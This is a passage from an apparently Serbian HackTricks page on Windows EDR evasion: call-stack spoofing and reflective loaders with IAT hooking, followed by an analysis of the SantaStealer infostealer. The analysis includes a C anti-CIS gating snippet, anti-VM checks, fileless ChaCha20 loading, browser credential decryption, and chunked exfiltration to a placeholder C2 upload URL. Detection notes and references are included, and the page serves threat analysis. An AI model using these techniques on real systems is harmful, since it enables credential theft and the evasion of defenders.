Call‑stack spoofing stub
- Draugr‑style PIC stubs kreiraju lažni call chain (return addresses into benign modules) i potom pivotaju u real API.
- Ovo zaobilazi detekcije koje očekuju canonical stacks od Beacon/BOFs ka sensitive APIs.
- Upari sa stack cutting/stack stitching techniques da bi sleteo unutar očekivanih frejmova pre API prologa.

Operativna integracija
- Prepend the reflective loader to post‑ex DLLs tako da PIC i hooks inicijalizuju automatski kada se DLL učita.
- Koristi Aggressor skriptu da registruješ target APIs tako da Beacon i BOFs transparentno profitiraju od istog evasion puta bez izmena koda.

Detekcija/DFIR razmatranja
- IAT integrity: unosi koji se rezolvuju na non‑image (heap/anon) adrese; periodična verifikacija import pointers.
- Stack anomalies: return addresses koji ne pripadaju loaded images; nagli prelazi na non‑image PIC; nekonzistentno RtlUserThreadStart poreklo.
- Loader telemetry: in‑process writes to IAT, rana DllMain aktivnost koja modifikuje import thunks, neočekivane RX regije kreirane pri učitavanju.
- Image‑load evasion: ako hooking LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assemblies korelisana sa memory masking events.

Povezani gradivni blokovi i primeri
- Reflective loaders koji obavljaju IAT patching tokom učitavanja (npr., TitanLdr, AceLdr)
- Memory masking hooks (npr., simplehook) i stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (npr., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustruje kako moderni info‑stealeri kombinuju AV bypass, anti‑analysis i credential access u jednom workflow‑u.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. Ako se pronađe ćirilični raspored tastature, sample ispušta prazan `CIS` marker i terminira pre pokretanja stealera, osiguravajući da se nikada ne detonira na izuzetim lokalitetima dok ostavlja hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita `check_antivm` logika

- Variant A prolazi kroz listu procesa, hešira svako ime prilagođenim rolling checksum-om i upoređuje ga sa ugrađenim blocklistama za debagere/sandbokse; ponavlja checksum i za ime računara i proverava radne direktorijume kao što su `C:\analysis`.
- Variant B ispituje sistemska svojstva (donja granica broja procesa, nedavno uptime), poziva `OpenServiceA("VBoxGuest")` da detektuje VirtualBox dodatke, i izvršava vremenske provere oko sleep-ova da otkrije single-stepping. Bilo koji pogodak prekida izvršavanje pre pokretanja modula.

### Fileless pomoćnik + dvostruko ChaCha20 reflective loading

- Primarni DLL/EXE ugrađuje Chromium credential helper koji se ili upiše na disk ili ručno mapira u memoriji; fileless mod sam rešava imports/relocations tako da se helper artefakti ne zapisuju.
- Taj helper čuva DLL druge faze enkriptovan dvaput ChaCha20 (dva 32-bajtna ključa + 12-bajtne nonce-e). Nakon obe runde, reflectively učitava blob (bez `LoadLibrary`) i poziva export-e `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- ChromElevator rutine koriste direct-syscall reflective process hollowing za injektovanje u živ Chromium browser, nasleđuju AppBound Encryption ključeve i dešifruju lozinke/cookiese/kreditne kartice direktno iz SQLite baza uprkos ABE hardening-u.


### Modularna in-memory kolekcija & chunked HTTP exfil

- `create_memory_based_log` iterira globalnu `memory_generators` tabelu pokazivača na funkcije i pokreće po jedan thread za svaki omogućeni modul (Telegram, Discord, Steam, screenshots, documents, browser extensions itd.). Svaki thread zapisuje rezultate u deljene bafer-e i prijavljuje broj fajlova nakon otprilike 45s join prozora.
- Kada se završi, sve se zipuje statički linkovanom `miniz` bibliotekom kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim spava 15s i streamuje arhivu u delovima od 10 MB putem HTTP POST-a na `http://<C2>:6767/upload`, lažno predstavljajući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a poslednji chunk dodatno šalje `complete: true` da C2 zna da je reassembly završen.

## Reference

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
